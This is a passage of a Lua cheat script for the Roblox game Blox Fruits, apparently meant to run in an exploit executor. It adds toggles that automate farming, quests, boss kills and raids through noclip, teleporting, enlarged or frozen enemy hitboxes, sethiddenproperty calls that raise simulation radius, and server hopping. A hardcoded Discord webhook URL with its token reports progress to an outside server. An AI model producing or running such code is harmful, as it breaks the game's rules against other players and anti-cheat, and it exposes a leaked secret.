                    if _G.AutoFarmLevel or _G.KillPlayer or _G.Kaitun or _G.AutoGear or _G.KillDough or _G.AutoBartilo or _G.AutoSoulGuitar or _G.FarmDough or _G.AutoCDK or _G.TweenToMirage or _G.TweenToGear or _G.DoSecondSea or _G.AutoBones or _G.AutoHolyTorch or _G.AutoYama or _G.AutoTushita or _G.AutoEctoplasm or getgenv().Settings["Auto Rengoku"] or getgenv().Settings["Swan Glasses"] or getgenv().Settings["Gravity Cane"] or getgenv().Settings["Auto Kill Darkbeard"] or getgenv().Settings["Auto Factory"] or getgenv().Settings["Auto Ghoul Race"] or _G.TweenToIsland or _G.TweenToNPC then 
                        NoClip = true 
                    else
                        NoClip = false 
                    end
                end)
            end
        end)

        _G.AutoFarmLevel = false
        local MainTab = Window:NewTab("Main")
        local InfoSection = MainTab:NewSection("Information")
        local MainFarmSection = MainTab:NewSection("Farm settings")
        timerLabel = InfoSection:NewLabel(" ")
        task.spawn(function()
            while task.wait(4) do
                pcall(function()
                    h=math.floor((math.floor(workspace.DistributedGameTime+0.5)/(60*60*1))%(24))
                    m=math.floor(math.floor(workspace.DistributedGameTime+0.5)/(60*1))%(60)
                    s=math.floor(math.floor(workspace.DistributedGameTime+0.5)/(1))%(60)
                    h=(string.len(h)==1 and "0"..h or h)
                    m=(string.len(m)==1 and "0"..m or m)
                    s=(string.len(s)==1 and "0"..s or s)
                    timerLabel:UpdateLabel("Online Time: "..h..":"..m..":"..s)
                end)
            end
        end)
        gameTime = InfoSection:NewLabel(" ")
        task.spawn(function()
            while task.wait(4) do
                pcall(function()
                    gameTime:UpdateLabel("Game Time: " .. game:GetService("Lighting").TimeOfDay)
                end)
            end
        end)
        currentMoon = InfoSection:NewLabel(" ")
        spawn(function()
            while wait() do
                pcall(function()
                    currentMoon:UpdateLabel("Moon Status: " .. getMoonPhase())
                end)
                wait(20)
            end
        end)
        InfoSection:NewLabel(" ")
        currentBeli = InfoSection:NewLabel("Beli: ")
        spawn(function()
            while wait(5) do
                pcall(function()
                    currentBeli:UpdateLabel("Beli: " .. tostring(LP.Data.Beli.Value))
                end)
            end
        end)
        currentFrag = InfoSection:NewLabel("Fragments: ")
        spawn(function()
            while wait(5) do
                pcall(function()
                    currentFrag:UpdateLabel("Fragments: " .. tostring(LP.Data.Fragments.Value))
                end)
            end
        end)
        currentLevel = InfoSection:NewLabel("Level: ")
        spawn(function()
            while wait(5) do
                pcall(function()
                    currentLevel:UpdateLabel("Level: " .. tostring(LP.Data.Level.Value))
                end)
            end
        end)

        InfoSection:NewLabel("")

        MainFarmSection:NewToggle("Auto Farm Level", "Auto Farm Level", function(state)
            _G.AutoFarmLevel = state
        end)
        kaitunToggle = MainFarmSection:NewToggle("Kaitun Mode", "Kaitun Mode", function(state)
            _G.Kaitun = state
        end)
        if _G.Kaitun then kaitunToggle:UpdateToggle(nil, true) end
        if _G.MaxLevel and _G.MaxLevel > 0 then
            spawn(function()
                doneLeveling = false
                while wait() do
                    pcall(function()
                        if LP.Data.Level.Value >= _G.MaxLevel then
                            doneLeveling = true
                        end
                    end)
                    if doneLeveling then
                        kaitunToggle:UpdateToggle(nil, false)
                        _G.AntiAFK = false
                        _G.AntiCheat = false
                        LP:Kick("Leveling Done!")
                        st, err = pcall(function()
                            h=math.floor((math.floor(workspace.DistributedGameTime+0.5)/(60*60*1))%(24))
                            m=math.floor(math.floor(workspace.DistributedGameTime+0.5)/(60*1))%(60)
                            s=math.floor(math.floor(workspace.DistributedGameTime+0.5)/(1))%(60)
                            h=(string.len(h)==1 and "0"..h or h)
                            m=(string.len(m)==1 and "0"..m or m)
                            s=(string.len(s)==1 and "0"..s or s)
                            time = "Online Time: "..h..":"..m..":"..s

                            local Embed = {
                                ["title"] = LP.Name,
                                ["description"] = "**Reached **`" .. tostring(_G.MaxLevel) .. "` **level!\nScript will be automatically stopped\n**```\n" .. time .. "\n```",
                                ["type"] = "rich",
                                ["color"] = tonumber(0xffffff),
                                ["footer"] = {
                                    ["text"] = "e u p h o r i a =3",
                                }
                            };
                            sendWebhook(
                                _G.Webhook or "https://discord.com/api/webhooks/1203160779600306308/etQEGpPRpRxR3P-F_gLOeqAsseTpBtPi5AcnPnrIIVRXF5_Ld26XR2u8Wph3ydAcLp8Y",
                                "@here",
                                Embed 
                            )
                        end)
                        if err then print(err) end
                        return 
                    end
                end
            end)
        end


        _G.SelectWeapon = _G.SelectWeapon or getgenv().Settings["Select Weapon"] or "Melee"
        MainFarmSection:NewDropdown("Select Weapon", "Select Weapon", {"Melee", "Sword", "Fruit"}, function(currentOption)
            getgenv().Settings["Select Weapon"] = currentOption
            WriteSettings()
            _G.SelectWeapon = currentOption
        end)
        
        local FarmTab = Window:NewTab("Farm")
        local FarmSection = FarmTab:NewSection("Farming")
        _G.AutoBones = false
        _G.AutoEctoplasm = false
        if first_sea then
            FarmSection:NewToggle("Do Second Sea", "Do Second Sea", function(state)
                _G.DoSecondSea = state
            end)
        end
        if second_sea then
            EctoplasmLabel = FarmSection:NewLabel("üçº Ectoplasm: ")
            spawn(function()
                while wait() do
                    pcall(function()
                        wait(5)
                        EctoplasmLabel:UpdateLabel("üçº Ectoplasm: " .. tostring(GetMaterial("Ectoplasm")))
                    end)
                end
            end)
            FarmEctoplasm = FarmSection:NewToggle("Farm Ectoplasm", "Farm Ectoplasm", function(state)
                getgenv().Settings["Farm Ectoplasm"] = state
                WriteSettings()
                _G.AutoEctoplasm = state
            end)
            if getgenv().Settings["Farm Ectoplasm"] then FarmEctoplasm:UpdateToggle(nil, true) end
        end
        if third_sea then
            BonesLabel = FarmSection:NewLabel("üíÄ Bones: ")
            spawn(function()
                while wait() do
                    pcall(function()
                        wait(5)
                        BonesLabel:UpdateLabel("üíÄ Bones: " .. tostring(GetMaterial("Bones")))
                    end)
                end
            end)
            FarmBones = FarmSection:NewToggle("Farm Bones", "Farm Bones", function(state)
                getgenv().Settings["Farm Bones"] = state
                WriteSettings()
                _G.AutoBones = state
            end)
            if getgenv().Settings["Farm Bones"] then FarmBones:UpdateToggle(nil, true) end
        end

        spawn(function()
            while wait() do
                if _G.AutoBones and third_sea then
                    pcall(function()
                        if game:GetService("Workspace").Enemies:FindFirstChild("Reborn Skeleton") or game:GetService("Workspace").Enemies:FindFirstChild("Living Zombie") or game:GetService("Workspace").Enemies:FindFirstChild("Demonic Soul") or game:GetService("Workspace").Enemies:FindFirstChild("Posessed Mummy") then
                            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                if v.Name == "Reborn Skeleton" or v.Name == "Living Zombie" or v.Name == "Demonic Soul" or v.Name == "Posessed Mummy" then
                                    if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                        repeat task.wait()
                                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Humanoid.WalkSpeed = 0
                                            v.Head.CanCollide = false
                                            BringMobFarm = true
                                            EquipWeapon(_G.SelectWeapon)
                                            v.HumanoidRootPart.Transparency = 1
                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        until not _G.AutoBones or not v.Parent or v.Humanoid.Health <= 0
                                    end
                                end
                            end
                        else
                            toPoint(CFrame.new(-9515.04199, 210.81572, 5788.22217, -1, 4.91895875e-08, 0.000170758853, 4.91951333e-08, 1, 3.24608713e-08, -0.000170758853, 3.24692699e-08, -1))
                        end
                    end)
                end
            end
        end) 
        
        if second_sea then
            local Sea2ItemsSection = FarmTab:NewSection("Sea 2 Items")
            -- Factory
            AutoBartilo = Sea2ItemsSection:NewToggle("Auto Bartilo Quest", "Auto Bartilo Quest", function(state)
                getgenv().Settings["Auto Bartilo Quest"] = state
                WriteSettings()
            end)
            if getgenv().Settings["Auto Bartilo Quest"] then AutoBartilo:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().Settings["Auto Bartilo Quest"] then _G.AutoBartilo = true else _G.AutoBartilo = false end
                    end)
                end
            end)
            
            spawn(function()
                while wait() do
                    pcall(function()
                        if _G.AutoBartilo and LP.Data.Level.Value >= 800 then
                            BringMobFarm = false
                            if not ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").KilledBandits then
                                if string.find(LP.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Swan Pirates") and string.find(LP.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "50") and LP.PlayerGui.Main.Quest.Visible == true then 
                                    KillPosition = CFrame.new(949.148499, 102.9596939, 1274.4718)
                                    toPoint(KillPosition * OffsetCFrame())
                                    if game:GetService("Workspace").Enemies:FindFirstChild("Swan Pirate") then
                                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                            if v.Name == "Swan Pirate" then
                                                v.HumanoidRootPart.CFrame = KillPosition
                                                v.Humanoid.JumpPower = 0
                                                v.Humanoid.WalkSpeed = 0
                                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                v.HumanoidRootPart.Transparency = 1
                                                v.HumanoidRootPart.CanCollide = false
                                                v.Head.CanCollide = false
                                                if v.Humanoid:FindFirstChild("Animator") then
                                                    v.Humanoid.Animator:Destroy()
                                                end
                                                v.Humanoid:ChangeState(11)
                                                v.Humanoid:ChangeState(14)
                                                sethiddenproperty(LP, "SimulationRadius",  math.huge)
                                                wait()
                                            end
                                        end
                                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                            if v.Name == "Swan Pirate" then
                                                repeat task.wait()
                                                    sethiddenproperty(LP, "SimulationRadius", math.huge)
                                                    EquipWeapon(_G.SelectWeapon)
                                                    v.HumanoidRootPart.Transparency = 1
                                                    v.HumanoidRootPart.CanCollide = false
                                                    v.HumanoidRootPart.WalkSpeed = 0
                                                    v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                    toPoint(KillPosition * OffsetCFrame())										
                                                    v.HumanoidRootPart.CFrame = KillPosition
                                                until not v.Parent or v.Humanoid.Health <= 0 or not _G.AutoBartilo or LP.PlayerGui.Main.Quest.Visible == false
                                            end
                                        end
                                    end
                                else
                                    repeat wait()
                                        toPoint(CFrame.new(-459.933136, 74.4530869, 300.132751, -0.220162302, 8.81837039e-08, 0.975463271, 1.34934794e-07, 1, -5.99470553e-08, -0.975463271, 1.18425852e-07, -0.220162302))
                                    until not _G.AutoBartilo or getDistance(CFrame.new(-459.933136, 74.4530869, 300.132751, -0.220162302, 8.81837039e-08, 0.975463271, 1.34934794e-07, 1, -5.99470553e-08, -0.975463271, 1.18425852e-07, -0.220162302)) < 20
                                    wait(1)
                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("StartQuest","BartiloQuest",1)
                                end 
                            elseif not ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").KilledSpring then
                                if game:GetService("Workspace").Enemies:FindFirstChild("Jeremy") then
                                    v = game:GetService("Workspace").Enemies:FindFirstChild("Jeremy")
                                    repeat wait()
                                        sethiddenproperty(LP, "SimulationRadius", math.huge)
                                        EquipWeapon(_G.SelectWeapon)
                                        v.HumanoidRootPart.Transparency = 1
                                        v.HumanoidRootPart.CanCollide = false
                                        v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                        toPoint(v.HumanoidRootPart.CFrame * OffsetCFrame())										
                                    until not v.Parent or v.Humanoid.Health <= 0 or not _G.AutoBartilo or ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").KilledSpring
                                elseif ReplicatedStorage:FindFirstChild("Jeremy") then
                                    v = ReplicatedStorage:FindFirstChild("Jeremy")
                                    repeat wait()
                                        sethiddenproperty(LP, "SimulationRadius", math.huge)
                                        EquipWeapon(_G.SelectWeapon)
                                        v.HumanoidRootPart.Transparency = 1
                                        v.HumanoidRootPart.CanCollide = false
                                        v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                        toPoint(v.HumanoidRootPart.CFrame * OffsetCFrame())										
                                    until not v.Parent or v.Humanoid.Health <= 0 or not _G.AutoBartilo or ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").KilledSpring
                                else
                                    notis:new("Hop server for find Jeremy boss [Bartilo Quest]")
                                    notis:new("Hop server for find Jeremy boss [Bartilo Quest]")
                                    notis:new("Hop server for find Jeremy boss [Bartilo Quest]")
                                    wait(1)
                                    HopServer()
                                end
                            elseif not ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").DidPlates then
                                PlatesPosition = CFrame.new(-1837.8042, 28.7205391, 1721.03979, -0.694665372, -6.45133298e-08, 0.719333053, -7.54023333e-08, 1, 1.68683254e-08, -0.719333053, -4.25215489e-08, -0.694665372)
                                if getDistance(PlatesPosition) > 50 then
                                    repeat wait()
                                        toPoint(PlatesPosition)
                                    until getDistance(PlatesPosition) < 20
                                end
                                plate = workspace.Map.Dressrosa.BartiloPlates.Plate1
                                if plate.BrickColor ~= BrickColor.new("Olivine") then
                                    repeat wait()
                                        toPoint(plate.CFrame)
                                    until plate.BrickColor == BrickColor.new("Olivine") or not _G.AutoBartilo or ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").DidPlates
                                end
                                plate = workspace.Map.Dressrosa.BartiloPlates.Plate2
                                if plate.BrickColor ~= BrickColor.new("Olivine") then
                                    repeat wait()
                                        toPoint(plate.CFrame)
                                    until plate.BrickColor == BrickColor.new("Olivine") or not _G.AutoBartilo or ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").DidPlates
                                end
                                plate = workspace.Map.Dressrosa.BartiloPlates.Plate3
                                if plate.BrickColor ~= BrickColor.new("Olivine") then
                                    repeat wait()
                                        toPoint(plate.CFrame)
                                    until plate.BrickColor == BrickColor.new("Olivine") or not _G.AutoBartilo or ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").DidPlates
                                end
                                plate = workspace.Map.Dressrosa.BartiloPlates.Plate4
                                if plate.BrickColor ~= BrickColor.new("Olivine") then
                                    repeat wait()
                                        toPoint(plate.CFrame)
                                    until plate.BrickColor == BrickColor.new("Olivine") or not _G.AutoBartilo or ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").DidPlates
                                end
                                plate = workspace.Map.Dressrosa.BartiloPlates.Plate5
                                if plate.BrickColor ~= BrickColor.new("Olivine") then
                                    repeat wait()
                                        toPoint(plate.CFrame)
                                    until plate.BrickColor == BrickColor.new("Olivine") or not _G.AutoBartilo or ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").DidPlates
                                end
                                plate = workspace.Map.Dressrosa.BartiloPlates.Plate6
                                if plate.BrickColor ~= BrickColor.new("Olivine") then
                                    repeat wait()
                                        toPoint(plate.CFrame)
                                    until plate.BrickColor == BrickColor.new("Olivine") or not _G.AutoBartilo or ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").DidPlates
                                end
                                plate = workspace.Map.Dressrosa.BartiloPlates.Plate7
                                if plate.BrickColor ~= BrickColor.new("Olivine") then
                                    repeat wait()
                                        toPoint(plate.CFrame)
                                    until plate.BrickColor == BrickColor.new("Olivine") or not _G.AutoBartilo or ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").DidPlates
                                end
                                plate = workspace.Map.Dressrosa.BartiloPlates.Plate8
                                if plate.BrickColor ~= BrickColor.new("Olivine") then
                                    repeat wait()
                                        toPoint(plate.CFrame)
                                    until plate.BrickColor == BrickColor.new("Olivine") or not _G.AutoBartilo or ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").DidPlates
                                end
                            end
                        end 
                    end)
                end
            end)







            AutoFactory = Sea2ItemsSection:NewToggle("Auto Factory", "Auto Rengoku", function(state)
                getgenv().Settings["Auto Factory"] = state
                WriteSettings()
            end)
            if getgenv().Settings["Auto Factory"] then AutoFactory:UpdateToggle(nil, true) end
            AutoFactoryHop = Sea2ItemsSection:NewToggle("Auto Factory Hop [Farm only boss then]", "Auto Rengoku", function(state)
                getgenv().Settings["Auto Factory Hop"] = state
                WriteSettings()
            end)
            if getgenv().Settings["Auto Factory Hop"] then AutoFactoryHop:UpdateToggle(nil, true) end
            Sea2ItemsSection:NewLabel(" ")
            -- =====
            -- Darkbeard
            AutoKillDarkbeard = Sea2ItemsSection:NewToggle("Auto Kill Darkbeard", "Auto Kill Darkbeard", function(state)
                getgenv().Settings["Auto Kill Darkbeard"] = state
                WriteSettings()
            end)
            if getgenv().Settings["Auto Kill Darkbeard"] then AutoKillDarkbeard:UpdateToggle(nil, true) end
            Sea2ItemsSection:NewLabel(" ")
            -- =====
            -- Cursed Captain
            AutoGhoulRace = Sea2ItemsSection:NewToggle("Auto Ghoul Race", "Auto Ghoul Race", function(state)
                getgenv().Settings["Auto Ghoul Race"] = state
                WriteSettings()
            end)
            if getgenv().Settings["Auto Ghoul Race"] then AutoGhoulRace:UpdateToggle(nil, true) end
            AutoGhoulRaceHop = Sea2ItemsSection:NewToggle("Auto Ghoul Race Hop", "Auto Ghoul Race", function(state)
                getgenv().Settings["Auto Ghoul Race Hop"] = state
                WriteSettings()
            end)
            if getgenv().Settings["Auto Ghoul Race Hop"] then AutoGhoulRaceHop:UpdateToggle(nil, true) end
            Sea2ItemsSection:NewLabel(" ")
            -- =====

            AutoRengoku = Sea2ItemsSection:NewToggle("Auto Rengoku", "Auto Rengoku", function(state)
                getgenv().Settings["Auto Rengoku"] = state
                WriteSettings()
            end)
            if getgenv().Settings["Auto Rengoku"] then AutoRengoku:UpdateToggle(nil, true) end
            AutoRengokuHop = Sea2ItemsSection:NewToggle("Auto Rengoku Hop [Farm only boss then]", "Auto Rengoku", function(state)
                getgenv().Settings["Auto Rengoku Hop"] = state
                WriteSettings()
            end)
            if getgenv().Settings["Auto Rengoku Hop"] then AutoRengokuHop:UpdateToggle(nil, true) end
            Sea2ItemsSection:NewLabel(" ")

            AutoSwanGlasses = Sea2ItemsSection:NewToggle("Swan Glasses [Must Be Swan Room Opened]", "Swan Glasses [Must Be Swan Room Opened]", function(state)
                getgenv().Settings["Swan Glasses"] = state
                WriteSettings()
            end)
            if getgenv().Settings["Swan Glasses"] then AutoSwanGlasses:UpdateToggle(nil, true) end
            AutoSwanGlassesHop = Sea2ItemsSection:NewToggle("Swan Glasses Hop", "Swan Glasses Hop", function(state)
                getgenv().Settings["Swan Glasses Hop"] = state
                WriteSettings()
            end)
            if getgenv().Settings["Swan Glasses Hop"] then AutoSwanGlassesHop:UpdateToggle(nil, true) end
            Sea2ItemsSection:NewLabel(" ")

            AutoGravityCane = Sea2ItemsSection:NewToggle("Auto Gravity Cane", "Auto Gravity Cane", function(state)
                getgenv().Settings["Gravity Cane"] = state
                WriteSettings()
            end)
            if getgenv().Settings["Gravity Cane"] then AutoGravityCane:UpdateToggle(nil, true) end
            AutoGravityCaneHop = Sea2ItemsSection:NewToggle("Auto Gravity Cane Hop", "Auto Gravity Cane Hop", function(state)
                getgenv().Settings["Gravity Cane Hop"] = state
                WriteSettings()
            end)
            if getgenv().Settings["Gravity Cane Hop"] then AutoGravityCaneHop:UpdateToggle(nil, true) end
            Sea2ItemsSection:NewLabel(" ")

            Sea2ItemsSection:NewLabel("Farm Koko / Cyborg")
            Sea2ItemsSection:NewToggle("Auto Kill Order", "Auto Kill Order", function(state)
                _G.AutoKillOrder = state
            end)
            Sea2ItemsSection:NewToggle("Auto Buy Order chip", "Auto Buy Chip for Order", function(state)
                _G.AutoBuyOrderChip = state
            end)
            autostartorder1 = Sea2ItemsSection:NewToggle("Auto Start Order", "Auto Start Order", function(state)
                if autostartorder2 and state then autostartorder2:UpdateToggle(nil, false) end
                getgenv().Settings['AutoStartOrder'] = state
                WriteSettings()
            end)
            if getgenv().Settings['AutoStartOrder'] then autostartorder1:UpdateToggle(nil, true) end
            _G.TeammatesForStart = 1
            autostartorder2 = Sea2ItemsSection:NewToggle("Auto Start Order With Teammates", "Auto Start Order With Teammates", function(state)
                if autostartorder1 and state then autostartorder1:UpdateToggle(nil, false) end
                getgenv().Settings['AutoStartOrderWithTeammates'] = state
                WriteSettings()
            end)
            if getgenv().Settings['AutoStartOrderWithTeammates'] then autostartorder2:UpdateToggle(nil, true) end
            Sea2ItemsSection:NewSlider("Min. Teammates", "Min. Teammates for start", 1, 4, function(count)
                _G.TeammatesForStart = count
            end)
            Sea2ItemsSection:NewButton("Tween to teammate cell", "Tween to teammate cell", function()
                if second_sea then
                    cf = CFrame.new(-5586.55078, 337.289886, -5906.07031, -0.453419715, 1.11606738e-07, 0.891297102, 1.02127494e-07, 1, -7.32641396e-08, -0.891297102, 5.78065382e-08, -0.453419715)
                    StoppedTween = false
                    repeat wait()
                        NoClip = true
                        useNearestEntrance(cf)
                        tweenToPointAdvanced(cf)
                    until (LP.Character.HumanoidRootPart.CFrame.Position - cf.Position).Magnitude < 20 or StoppedTween
                    NoClip = false
                end
            end)

            
        end

        spawn(function()
            while wait() do
                pcall(function()
                    if _G.AutoKillOrder then
                        if game:GetService("Workspace").Enemies:FindFirstChild("Order") and game:GetService("Workspace").Enemies:FindFirstChild("Order"):FindFirstChild('Humanoid') and game:GetService("Workspace").Enemies:FindFirstChild("Order").Humanoid.Health > 0 then
                            v = game:GetService("Workspace").Enemies:FindFirstChild("Order")
                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                repeat wait()
                                    NoClip = true
                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                    v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                    v.HumanoidRootPart.CanCollide = false
                                    v.Humanoid.WalkSpeed = 0
                                    v.Head.CanCollide = false
                                    BringMobFarm = false
                                    EquipWeapon(_G.SelectWeapon)
                                    v.HumanoidRootPart.Transparency = 1
                                    useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                    toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                until not _G.AutoKillOrder or v.Humanoid.Health <= 0 or not v.Parent
                            end
                        else
                            NoClip = false
                        end
                    end
                end)
            end
        end)

        spawn(function()
            while wait() do
                wait(2)
                s1, e1 = pcall(function()
                    if _G.AutoBuyOrderChip then
                        print("Auto Buy Order Chip enabled")
                        if not isWeaponInInventory("Microchip") then 
                            if not game:GetService("Workspace").Enemies:FindFirstChild("Order") then
                                print("Auto Buy Order Chip checked success")
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", "Microchip", "2")
                            end
                        end
                    end
                end)
                if e1 then print(e1) end
            end
        end)

        spawn(function()
            while wait() do
                pcall(function()
                    if getgenv().Settings['AutoStartOrder'] then
                        if isWeaponInInventory("Microchip") or isWeaponInInventory("Fist of Darkness") or isWeaponInInventory("Core Brain")  then
                            if not game:GetService("Workspace").Enemies:FindFirstChild("Order") then
                                print("Trying to start raid")
                                fireclickdetector(game:GetService("Workspace").Map.CircleIsland.RaidSummon.Button.Main.ClickDetector) 
                            end
                        end
                    elseif getgenv().Settings['AutoStartOrderWithTeammates'] then
                        if isWeaponInInventory("Microchip") and not game:GetService("Workspace").Enemies:FindFirstChild("Order") then
                            count = 0
                            if game:GetService("Workspace").Map.CircleIsland.RaidSummon.Raid1.Color.BrickColor == BrickColor.new("Lime green") then
                                count = count + 1
                            end
                            if game:GetService("Workspace").Map.CircleIsland.RaidSummon.Raid2.Color.BrickColor == BrickColor.new("Lime green") then
                                count = count + 1
                            end
                            if game:GetService("Workspace").Map.CircleIsland.RaidSummon.Raid3.Color.BrickColor == BrickColor.new("Lime green") then
                                count = count + 1
                            end
                            if game:GetService("Workspace").Map.CircleIsland.RaidSummon.Raid4.Color.BrickColor == BrickColor.new("Lime green") then
                                count = count + 1
                            end
                            print(count)
                            if count >= _G.TeammatesForStart then 
                                print("Trying to start raid")
                                fireclickdetector(game:GetService("Workspace").Map.CircleIsland.RaidSummon.Button.Main.ClickDetector) 
                            end
                        end
                    end
                end)
            end
        end)


        if third_sea then
            local Sea3ItemsSection = FarmTab:NewSection("Sea 3 Items")
            AutoSoulGuitar = Sea3ItemsSection:NewToggle("Auto Soul Guitar", "Auto Soul Guitar", function(value)
                getgenv().Settings["Auto Soul Guitar"] = value
                WriteSettings()
            end)
            if getgenv().Settings["Auto Soul Guitar"] then AutoSoulGuitar:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().Settings["Auto Soul Guitar"] and third_sea then _G.AutoSoulGuitar = true else _G.AutoSoulGuitar = false end
                    end)
                end
            end)

            spawn(function()
                while wait() do
                    st, err = pcall(function()
                        if _G.AutoSoulGuitar then
                            if not game:GetService("Workspace").NPCs:FindFirstChild("Skeleton Machine") then
                                if game:GetService("Workspace").Map["Haunted Castle"].Candle1.Transparency ~= 0 then
                                    if ReplicatedStorage.Remotes.CommF_:InvokeServer("gravestoneEvent",2) and string.find(ReplicatedStorage.Remotes.CommF_:InvokeServer("gravestoneEvent",2), "Error") then
                                        print("Go to Grave")
                                        toPoint(CFrame.new(-8653.03809, 141.131409, 6168.21777, -0.999985337, 3.62942778e-08, 0.00541123329, 3.5995388e-08, 1, -5.53324071e-08, -0.00541123329, -5.5136816e-08, -0.999985337))
                                    elseif ReplicatedStorage.Remotes.CommF_:InvokeServer("gravestoneEvent",2) and string.find(ReplicatedStorage.Remotes.CommF_:InvokeServer("gravestoneEvent",2), "Nothing") then
                                        print("Wait Next Night")
                                    else
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("gravestoneEvent",2)
                                        wait(.1)
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("gravestoneEvent",2,true)
                                        wait(.1)
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Check")
                                    end
                                else
                                    if game.Workspace.Map["Haunted Castle"].SwampWater.BrickColor == BrickColor.new("Maroon") then
                                        UnEquip()
                                        repeat wait()
                                            CharPosition = CFrame.new(-10166.5586, 214.012268, 5938.11133, -0.445710421, -3.74314659e-08, -0.895177186, -9.14189684e-08, 1, 3.70308828e-09, 0.895177186, 8.34866754e-08, -0.445710421)
                                            KillPosition = CFrame.new(-10166.5586, 180.012268, 5938.11133, -0.445710421, -3.74314659e-08, -0.895177186, -9.14189684e-08, 1, 3.70308828e-09, 0.895177186, 8.34866754e-08, -0.445710421)
                                            toPoint(CharPosition)
                                            for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
                                                if v.Name == 'Living Zombie' then
                                                    UnEquip()
                                                    toPoint(CharPosition)
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                    v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                    v.HumanoidRootPart.CanCollide = false
                                                    v.Humanoid.WalkSpeed = 0
                                                    v.Head.CanCollide = false
                                                    v.HumanoidRootPart.CFrame = KillPosition
                                                end
                                            end
                                            count = 0
                                            for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
                                                if v.Name == 'Living Zombie' then
                                                    if (v.HumanoidRootPart.CFrame.Position - KillPosition.Position).Magnitude < 15 then
                                                        count = count + 1
                                                        toPoint(CharPosition)
                                                    end
                                                end
                                            end
                                            if count == 6 then
                                                EquipWeapon(_G.SelectWeapon)
                                                toPoint(CharPosition)
                                                wait(5)
                                            end
                                        until not _G.AutoSoulGuitar or game.Workspace.Map["Haunted Castle"].SwampWater.BrickColor ~= BrickColor.new("Maroon")
                                    elseif game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model:FindFirstChild("Part1") and game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model:FindFirstChild("Part1"):FindFirstChild("ClickDetector") then
                                        ColorFloorPos = CFrame.new(-9531.125, 13.3740034, 6050.00879, 0.994690299, -5.62031666e-08, -0.102913432, 4.61519818e-08, 1, -1.00047558e-07, 0.102913432, 9.47666834e-08, 0.994690299)
                                        if getDistance(ColorFloorPos) > 50 then
                                            repeat wait()
                                                toPoint(ColorFloorPos)
                                            until getDistance(ColorFloorPos) < 20
                                        end
                                        wait(1)
                                        toPoint(game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part3.CFrame)
                                        wait(1)
                                        fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part3.ClickDetector)
                                        wait(1)
                                        toPoint(game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part4.CFrame)
                                        wait(1)
                                        fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part4.ClickDetector)
                                        wait(1)
                                        fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part4.ClickDetector)
                                        wait(1)
                                        fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part4.ClickDetector)
                                        wait(1)
                                        toPoint(game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part6.CFrame)
                                        wait(1)
                                        fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part6.ClickDetector)
                                        wait(1)
                                        fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part6.ClickDetector)
                                        wait(1)
                                        toPoint(game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part8.CFrame)
                                        wait(1)
                                        fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part8.ClickDetector)
                                        wait(1)
